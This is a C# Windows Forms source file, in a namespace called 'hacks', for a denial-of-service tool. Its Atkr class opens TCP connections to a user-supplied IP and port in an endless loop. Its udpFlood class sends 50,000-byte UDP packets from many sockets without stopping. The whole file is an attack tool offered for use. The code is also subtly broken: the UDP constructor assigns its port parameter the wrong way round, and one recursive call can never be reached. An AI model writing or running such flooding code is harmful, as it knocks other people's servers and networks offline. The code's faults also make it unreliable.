using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;




namespace hacks
{
    public partial class Form1 : Form
    {
        Atkr[] a; udpFlood[] fldr;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            //Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Icmp);
            //s.Send(new byte[1024]);

        }
        private void button1_Click(object sender, EventArgs e)
        {
            fldr = new udpFlood[Convert.ToInt32(textBox3.Text)];
            //a = new Atkr[Convert.ToInt32(textBox3.Text)];
            for (int i = 0; i != Convert.ToInt32(textBox3.Text); )
            {
                try
                {
                    //a[i++] = new Atkr(this.textBox1.Text, Convert.ToInt32(textBox2.Text));
                    fldr[i++] = new udpFlood(Convert.ToInt32(textBox4.Text), textBox1.Text, Convert.ToInt32(textBox2.Text));
                }
                catch { }
            }

        }


        /*void close()
        {

            //tc.Client.Shutdown(SocketShutdown.Both);
            //tc.Client.Disconnect(false);
            tc.Close();
            //MessageBox.Show(tl.Server.RemoteEndPoint.ToString());
        }*/
    }
    public class Atkr
    {
        TcpClient tc;
        Thread t;
        IPAddress ip;
        int port;
        public Atkr(string ipa, int Port)
        {
            port = Port;
            ip = IPAddress.Parse(ipa);
            t = new Thread(new ThreadStart(atk));
            t.Start();
        }
        void atk()
        {
            try
            {
                tc = new TcpClient(ip.ToString(), port);
            }
            catch
            {  }
            do
            {
                try
                {
                    //tc.Close();
                    tc = new TcpClient(ip.ToString(), port);
                   
                }
                catch { }
            } while (true);

        }








    }
    class udpFlood
    {
        UdpClient[] c;
        Thread t;
        int guys;
        IPAddress target;
        int port;
        public udpFlood(int guy, string ipa, int port)
        {
            target = IPAddress.Parse(ipa);
            port = this.port;
            guys = guy;
            c = new UdpClient[guys];
            for (int i = 0; i != guys; )
            {

                c[i++] = new UdpClient(target.ToString(), port);






            }
            t = new Thread(new ThreadStart(atk));
            t.Start();







        }
        void atk()
        {
            byte[] msg = new byte[50000];
            do
            {
                for (int i = 0; i != guys; )
                {


                    try
                    {
                        c[i++].Send(msg, 50000);
                    }
                    catch { }
                }




            } while (true);
            atk();
        }





    }

}
